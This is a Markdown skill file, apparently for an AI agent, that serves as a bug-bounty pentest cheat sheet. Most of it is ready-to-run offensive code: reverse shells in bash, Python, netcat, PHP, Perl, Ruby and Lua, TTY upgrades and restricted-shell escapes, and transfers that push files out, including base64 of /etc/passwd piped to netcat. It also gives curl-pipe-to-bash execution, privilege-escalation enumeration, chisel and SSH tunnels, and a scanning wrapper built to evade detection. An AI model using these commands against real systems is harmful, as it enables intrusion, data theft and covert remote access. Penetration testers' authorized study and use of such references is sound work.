---
name: bug-bounty-toolkit
description: >-
  Curated reference of Linux pentesting commands and tool selection guide
  for bug bounty hunting. Covers reverse shells, TTY upgrade, privilege
  escalation enumeration, file transfer techniques, tunneling/proxying,
  and automated reconnaissance pipelines. Organized by pentest phase:
  recon, enumeration, exploitation, priv esc, and post-exploitation.
  Includes tool selection decision matrices (which port scanner, web
  scanner, C2 framework for each scenario) and common one-liners.
  Activates for requests involving Linux pentest commands, reverse
  shell, TTY upgrade, tunneling, proxying, tool recommendations,
  or pentest command reference.
domain: cybersecurity
subdomain: web-application-security
tags:
  - bug-bounty
  - linux-commands
  - reverse-shell
  - privilege-escalation
  - tunneling
  - proxying
  - tool-catalog
  - pentest-reference
  - tty-upgrade
  - file-transfer
  - enumeration
version: "1.0"
author: mahipal
license: Apache-2.0
nist_csf:
  - ID.RA-01
  - PR.PS-01
mitre_attack:
  - T1059
  - T1071
  - T1090
  - T1572
---

# Bug Bounty Toolkit Reference

Quick reference for Linux commands, tool selection, and operational workflows used across all bug bounty phases. Based on pentest lifecycle patterns and tool catalogs curated from real engagements.

---

## Reverse Shell Cheat Sheet

### Bash Reverse Shells

```bash
# Basic TCP reverse shell
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# With exec (cleaner process tree)
bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/4444 <&1'

# Read loop variant (works when -i fails)
exec 5<>/dev/tcp/10.10.10.10/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Python Reverse Shells

```python
# Python 3 one-liner
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat / Ncat

```bash
# Traditional netcat (-e may not be available)
nc -e /bin/bash 10.10.10.10 4444

# Without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# Ncat with SSL
ncat --ssl 10.10.10.10 4444 -e /bin/bash
```

### Other Interpreters

```bash
# PHP exec
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP system (web context)
<?php system("bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/4444 <&1'"); ?>

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e 'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Lua
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('10.10.10.10',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
```

---

## TTY Shell Upgrade

### Full Interactive TTY

```bash
# Method 1: Python (most reliable)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Method 2: Script command
script /dev/null -c /bin/bash
# Ctrl+Z, then:
stty raw -echo; fg

# Method 3: Expect
expect -c 'spawn /bin/bash; interact'

# Method 4: Socat
# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444

# After getting TTY, set terminal size:
stty rows 38 columns 116
```

### Restricted Shell Escape

```bash
# SSH with command
ssh user@target -t "bash --noprofile"

# Vi/Vim
vi → :set shell=/bin/bash → :shell

# AWK
awk 'BEGIN {system("/bin/bash")}'

# Python/Python3
python3 -c 'import os; os.system("/bin/bash")'

# Expect
expect -c 'spawn /bin/bash; interact'

# Find
find / -name anything -exec /bin/bash \;
```

---

## File Transfer Techniques

### HTTP Servers (Quick One-Liners)

```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000

# Node.js
npx http-server -p 8000

# BusyBox
busybox httpd -f -p 8000
```

### Download Methods

```bash
# On victim — pull file from attacker
wget http://10.10.10.10:8000/linpeas.sh -O /tmp/lp.sh
curl http://10.10.10.10:8000/exploit.sh -o /tmp/exploit.sh

# Netcat transfer
# Attacker (send): nc -lvp 4444 < file
# Victim (receive): nc 10.10.10.10 4444 > file

# Base64 encoding (bypass content filters)
base64 -w0 /etc/passwd | nc 10.10.10.10 4444
# Decode on attacker: base64 -d < received.txt

# /dev/tcp (bash built-in, no external tools needed)
exec 3<>/dev/tcp/10.10.10.10/80
echo -e "GET /file HTTP/1.0\n" >&3
cat <&3
```

---

## Privilege Escalation Enumeration

### Quick Linux Privesc Checks

```bash
# Sudo privileges
sudo -l
# Check for NOPASSWD entries, specific binaries

# SUID binaries (critical privesc vectors)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Writable files owned by root
find / -writable -user root -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.* 2>/dev/null
crontab -l 2>/dev/null

# Running services (internal-only services often lack auth)
ss -tulpn | grep LISTEN
netstat -tulpn 2>/dev/null

# World-writable directories
find / -perm -o+w -type d 2>/dev/null
```

### Automated Enumeration

```bash
# LinPEAS (comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# LinEnum (focused)
./LinEnum.sh -t -r report.txt

# Linux Exploit Suggester
./linux-exploit-suggester.sh --uname "$(uname -r)"

# pspy (unprivileged process monitor)
./pspy64 -p -i 1000
```

---

## Tunneling & Proxying

### Chisel — Fast TCP Tunnel over HTTP

```bash
# Server (attacker)
./chisel server -p 8080 --reverse

# Client (victim) — create SOCKS proxy
./chisel client http://10.10.10.10:8080 R:socks

# Client — forward specific port
./chisel client http://10.10.10.10:8080 R:3306:127.0.0.1:3306
```

### SSH Tunneling

```bash
# Local port forward (access remote service locally)
ssh -L 8080:internal.target:80 user@jumphost

# Dynamic SOCKS proxy
ssh -D 9050 user@jumphost
# Then configure proxychains: socks5 127.0.0.1 9050

# Remote port forward (expose local service)
ssh -R 8080:localhost:80 user@attacker
```

### Proxychains Configuration

```ini
# /etc/proxychains.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

```bash
# Route tools through proxy
proxychains4 nmap -sT -Pn internal.target
proxychains4 curl http://internal.target/admin
proxychains4 sqlmap -u "http://internal.target/page?id=1"
```

---

## Tool Selection Matrix

### Port Scanner Selection

| Scenario | Tool | Command |
|----------|------|---------|
| Internet-wide scan | masscan | `masscan -p1-65535 CIDR --rate=10000` |
| Single host (fast) | rustscan | `rustscan -a IP -- -A -sC` |
| Service fingerprinting | nmap | `nmap -sV -sC -p- IP -oA scan` |
| Internal network | naabu | `naabu -host IP -p -` |
| From behind proxy | nmap -sT | `proxychains nmap -sT -Pn IP` |

### Web Scanner Selection

| Scenario | Tool | Command |
|----------|------|---------|
| Quick vulnerability check | nuclei | `nuclei -l urls.txt -t templates/` |
| Deep web crawl + scan | xray/zap | Burp/ZAP active scan |
| API fuzzing | ffuf | `ffuf -w wordlist -u URL/FUZZ` |
| SQL injection | sqlmap | `sqlmap -u "URL" --batch` |
| XSS detection | dalfox | `dalfox pipe < urls.txt` |

### File Transfer Selection

| If target has... | Use... |
|-----------------|--------|
| curl/wget | `curl http://IP:8000/file -o /tmp/f` |
| netcat | `nc IP 4444 < file` (send) / `nc -lvp 4444 > file` (receive) |
| bash only | `exec 3<>/dev/tcp/IP/80; echo -e "GET /file HTTP/1.0\n" >&3; cat <&3` |
| python3 | `python3 -m http.server 8000` (serve) |
| php | `php -S 0.0.0.0:8000` (serve) |
| No network tools | Base64 encode + copy/paste |

---

## Common Automation Patterns

### Quick Recon Pipeline

```bash
#!/bin/bash
TARGET="$1"
OUTDIR="recon_${TARGET}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

# Passive subdomain enum
subfinder -d "$TARGET" -all -o "$OUTDIR/subs_passive.txt"
amass enum -passive -d "$TARGET" -o "$OUTDIR/subs_amass.txt"

# DNS resolution
cat "$OUTDIR/subs_passive.txt" "$OUTDIR/subs_amass.txt" | sort -u | \
  dnsx -a -resp -o "$OUTDIR/resolved.txt"

# HTTP probing
cat "$OUTDIR/resolved.txt" | awk '{print $1}' | \
  httpx -status-code -title -tech-detect -o "$OUTDIR/live_hosts.txt"

# Quick vulnerability scan
cat "$OUTDIR/live_hosts.txt" | awk -F',' '{print $1}' | \
  nuclei -t ~/nuclei-templates/http/ -severity critical,high -o "$OUTDIR/nuclei_results.txt"

echo "[+] Recon complete — results in $OUTDIR/"
echo "    Live hosts: $(wc -l < $OUTDIR/live_hosts.txt)"
echo "    Nuclei findings: $(wc -l < $OUTDIR/nuclei_results.txt)"
```

### Stealth Scanning Wrapper

```python
"""Rate-limited scanning with random jitter to avoid detection."""
import time, random

def stealth_scan(targets, scan_func, delay=(2, 8)):
    results = []
    for target in targets:
        time.sleep(random.uniform(*delay))
        results.append(scan_func(target))
    return results

# Usage: stealth_scan(urls, lambda u: requests.get(u))
```

---

## Environment Variables Reference

```bash
# Common tool configuration
export NUCLEI_TEMPLATES_PATH="/opt/nuclei-templates"
export GOPATH="$HOME/go"
export PATH="$PATH:$GOPATH/bin"

# API keys for recon tools
export SHODAN_API_KEY="your-key"
export CENSYS_API_ID="your-id"
export CENSYS_API_SECRET="your-secret"
export VT_API_KEY="your-vt-key"
export GITHUB_TOKEN="ghp_xxx"
export CHAOS_API_KEY="your-chaos-key"

# Target scope (export for scripting)
export TARGET="example.com"
export TARGET_URL="https://app.example.com"
export COOKIE="session=xxx"
```
